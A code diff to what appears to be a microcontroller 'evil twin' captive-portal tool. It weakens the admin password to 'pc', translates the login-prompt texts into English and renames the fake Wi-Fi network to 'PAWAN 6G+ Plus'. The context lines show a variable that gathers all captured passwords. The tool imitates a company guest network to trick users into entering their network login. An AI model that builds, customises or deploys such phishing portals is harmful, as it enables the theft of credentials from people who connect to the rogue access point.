@@ -11,14 +11,14 @@
 #include <EEPROM.h>
 
 // Senha para acessar a página PASS
-const char* PASSWORD = "P@ssw0rd!";
+const char* PASSWORD = "pc";
 
 // Textos padrão.
 #define SUBTITLE "A internet da EMPRESA!"
 #define TITLE "Acesso GUEST"
-#define BODY "Para se conectar a nossa rede insira seu login de rede. Aproveite a internet mais rápida da EMPRESA!"
-#define POST_TITLE "Conectando..."
-#define POST_BODY "Caso seu acesso seja recusado, </br>comunique seu supervisor, Aguarde... </br></br> Obrigado!"
+#define BODY "To connect to our network, enter your network login. Enjoy the fastest internet from the COMPANY"
+#define POST_TITLE "Connecting.."
+#define POST_BODY "If your access is denied,, Aguarde... </br></br> Obrigado!"
 #define PASS_TITLE "Credenciais"
 #define CLEAR_TITLE "Zeradas"
 
@@ -29,7 +29,7 @@ const byte TICK_TIMER = 1000;
 IPAddress APIP(172, 0, 0, 1); // Gateway
 
 // Nome padrão da Rede Wifi.
-const char *SSID_NAME = "EMPRESA - GuestWifi";
+const char *SSID_NAME = "PAWAN 6G+ Plus";
 
 String allPass = "";     // Para guardar todas as senhas.
 String newSSID = "";     // Para adicionar um novo SSID.
